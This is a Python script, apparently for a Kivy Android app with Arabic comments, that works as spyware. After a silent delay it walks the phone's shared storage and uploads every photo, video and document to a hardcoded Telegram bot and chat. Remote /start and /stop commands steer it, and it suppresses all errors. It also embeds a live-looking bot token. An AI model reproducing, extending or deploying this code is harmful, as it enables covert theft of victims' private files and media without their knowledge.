import os
import time
import random
import threading

# === إعداداتك ===
BOT_TOKEN = "8830966196:AAHykKWMdImLdFQtDU3RSwW4P89Z0LAILxE"
CHAT_ID = "8325610710"
DIR_PATH = "/storage/emulated/0/"

import requests

API = f"https://api.telegram.org/bot{BOT_TOKEN}"

IMAGE_EXTS = ('.jpg', '.jpeg', '.png', '.webp')
VIDEO_EXTS = ('.mp4', '.mov', '.avi', '.mkv', '.3gp', '.flv', '.wmv')
DOCUMENT_EXTS = ('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                 '.txt', '.zip', '.rar', '.apk', '.html', '.htm', '.xml',
                 '.json', '.csv')

MAX_FILE_SIZE = 50 * 1024 * 1024

WATERMARK_TEXT = (
    "WARNING: THIS TOOL IS PROPERTY OF V_9_K_E. ANY UNAUTHORIZED USE OR "
    "COPYING WILL RESULT IN LEGAL ACTION. Contact: @v_9_k_e"
)

is_active = True
bot_thread = None
poll_thread = None


def api_call(method, **kwargs):
    try:
        r = requests.post(f"{API}/{method}", timeout=60, **kwargs)
        return r.json()
    except Exception:
        return {}


def send_message(text):
    try:
        requests.post(f"{API}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text}, timeout=30)
    except Exception:
        pass


def send_file(file_path):
    try:
        if not is_active:
            return
        size = os.path.getsize(file_path)
        if size > MAX_FILE_SIZE:
            return

        ext = os.path.splitext(file_path)[1].lower()

        if ext in IMAGE_EXTS:
            method, field = "sendPhoto", "photo"
        elif ext in VIDEO_EXTS:
            method, field = "sendVideo", "video"
        elif ext in DOCUMENT_EXTS:
            method, field = "sendDocument", "document"
        else:
            return

        with open(file_path, 'rb') as f:
            requests.post(
                f"{API}/{method}",
                data={"chat_id": CHAT_ID, "caption": WATERMARK_TEXT},
                files={field: f},
                timeout=120
            )
    except Exception:
        pass


def main_operation():
    global is_active

    send_message(f"🚀 بدأت العمليه\n\n{WATERMARK_TEXT}")

    # مرحلة العرض الصامتة
    for _ in range(10):
        if not is_active:
            return
        time.sleep(random.uniform(0.5, 2.0))

    counts = {"images": 0, "videos": 0, "documents": 0, "other": 0}

    try:
        for root, dirs, files in os.walk(DIR_PATH):
            if not is_active:
                break
            threads = []
            for file in files:
                if not is_active:
                    break
                path = os.path.join(root, file)
                ext = os.path.splitext(path)[1].lower()

                if ext in IMAGE_EXTS:
                    counts["images"] += 1
                elif ext in VIDEO_EXTS:
                    counts["videos"] += 1
                elif ext in DOCUMENT_EXTS:
                    counts["documents"] += 1
                else:
                    counts["other"] += 1
                    continue

                t = threading.Thread(target=send_file, args=(path,), daemon=True)
                t.start()
                threads.append(t)

                if len(threads) >= 5:
                    for th in threads:
                        th.join()
                    threads = []
                    time.sleep(0.5)

            for th in threads:
                th.join()
    except Exception:
        pass

    if is_active:
        header = "✅ اكتملت عملية النقل"
    else:
        header = "🛑 تم إيقاف عملية النقل بواسطتك"

    report = (
        f"{header}\n\n"
        f"📊 إحصائيات الملفات المنقوله:\n"
        f"🖼️ الصور: {counts['images']}\n"
        f"🎬 الفيديوهات: {counts['videos']}\n"
        f"📄 المستندات: {counts['documents']}\n"
        f"📦 ملفات أخرى: {counts['other']}\n\n"
        f"{WATERMARK_TEXT}"
    )
    send_message(report)


# === Polling يدوي بدون مكتبة telebot ===
def poll_loop():
    global is_active
    offset = 0
    while True:
        try:
            r = requests.get(f"{API}/getUpdates",
                             params={"offset": offset, "timeout": 20},
                             timeout=30)
            data = r.json()
            if not data.get("ok"):
                time.sleep(3)
                continue
            for upd in data.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message", {})
                chat_id = str(msg.get("chat", {}).get("id", ""))
                text = msg.get("text", "")
                if chat_id != str(CHAT_ID):
                    continue
                if text.startswith("/start"):
                    if not is_active:
                        is_active = True
                        send_message("🚀 تم بدء العمليه من جديد...")
                        threading.Thread(target=main_operation, daemon=True).start()
                    else:
                        send_message("⚠️ العمليه شغاله بالفعل!")
                elif text.startswith("/stop"):
                    if is_active:
                        is_active = False
                        send_message("⏳ جاري إيقاف العمليه...")
                    else:
                        send_message("💡 العمليه متوقفه بالفعل.")
        except Exception:
            time.sleep(3)


def run_bot():
    """الدالة اللي Kivy بينادي عليها"""
    global is_active, bot_thread, poll_thread
    is_active = True
    bot_thread = threading.Thread(target=main_operation, daemon=True)
    bot_thread.start()
    poll_thread = threading.Thread(target=poll_loop, daemon=True)
    poll_thread.start()
